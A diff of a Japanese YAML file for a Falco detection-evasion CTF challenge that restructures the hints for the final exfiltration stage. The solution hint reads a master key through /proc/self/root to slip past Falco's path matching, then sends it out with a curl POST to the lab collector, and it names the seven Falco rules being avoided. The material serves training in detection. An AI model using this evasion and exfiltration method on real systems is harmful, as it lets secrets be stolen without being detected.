@@ -28,24 +28,42 @@ steps:
       (時間が経っても自動的には解除されない)。やり直すと exfil の記録も
       消えるので、その場合はもう一度 (2) の持ち出しからやり直すこと。
 hints:
-  - 3 条件がある — 発火させず読む / collector へ exfil 済み / 提出。順番に片付けよう。
-  - 送信手段が鍵。reverse shell は collector (HTTP 受信のみ) に届かず、自前ツールの投下は Drop-and-execute を踏む。箱にある道具だけで完結させる。
-  - |
-    想定解:
-    FLAG=$(cat /proc/self/root/opt/nimbus/vault/master.key)
-    # /proc/self/root 経由で読むので fd.name が監視対象の path と一致せず発火しない (03 の技法の再利用)
+  - kind: rule
+    text: >-
+      3 条件がある — 発火させず読む / collector へ exfil 済み / 提出。順番に片付けよう。
+      禁止ルールはこれまでの 01〜09 で学んだ全 7 本 — この attempt で 1 つでも発火させると、
+      やり直すまで提出できなくなる (時間が経っても自動的には解除されない)。
+    ruleRefs:
+      - Contact K8S API Server From Container
+      - Read sensitive file untrusted
+      - Search Private Keys or Passwords
+      - Run shell untrusted
+      - Drop and execute new binary in container
+      - Redirect STDOUT/STDIN to Network Connection in Container
+      - Create Hardlink Over Sensitive Files
+  - kind: command
+    text: >-
+      送信手段が鍵。reverse shell は collector (HTTP 受信のみ) に届かず、自前ツールの
+      投下は Drop-and-execute を踏む。箱にある道具だけで完結させる。持ち出し (exfil)
+      に使う道具はコマンド集『5. ネットワーク / 送信』を参照。
+    cheatsheetRef: "5"
+  - kind: solution
+    text: |
+      想定解:
+      FLAG=$(cat /proc/self/root/opt/nimbus/vault/master.key)
+      # /proc/self/root 経由で読むので fd.name が監視対象の path と一致せず発火しない (03 の技法の再利用)
 
-    curl -s "$FALCO_CTF_COLLECTOR/api/challenges/10-final-exfil/exfil" \
-      -H 'Content-Type: application/json' \
-      -d "{\"user\":\"$FALCO_CTF_USER\",\"flag\":\"$FLAG\"}"
-    # 既存の curl で collector へ静かに HTTP POST。reverse shell や自前バイナリの
-    # drop+実行は禁止ルールに触れるのでここでは使わない
+      curl -s "$FALCO_CTF_COLLECTOR/api/challenges/10-final-exfil/exfil" \
+        -H 'Content-Type: application/json' \
+        -d "{\"user\":\"$FALCO_CTF_USER\",\"flag\":\"$FLAG\"}"
+      # 既存の curl で collector へ静かに HTTP POST。reverse shell や自前バイナリの
+      # drop+実行は禁止ルールに触れるのでここでは使わない
 
-    source /opt/ctf/submit.sh
-    submit 10-final-exfil "$FLAG"
-    # 禁止ルール 7 つを 1 つも踏んでいなければ、これで CLEARED
-    # (1 つでも発火させていた場合はこの attempt では通らない。やり直すと exfil の
-    # 記録も消えるので、その場合は curl の送信からやり直すこと)
+      source /opt/ctf/submit.sh
+      submit 10-final-exfil "$FLAG"
+      # 禁止ルール 7 つを 1 つも踏んでいなければ、これで CLEARED
+      # (1 つでも発火させていた場合はこの attempt では通らない。やり直すと exfil の
+      # 記録も消えるので、その場合は curl の送信からやり直すこと)
 bridge: >-
   master key は、Falco に一度も気づかれることなく箱の外へ抜けた。CTF Company の
   キルチェーンは踏破 — だが本当の学びは攻撃側ではない。あなたが避けた検知の一つ一つが、
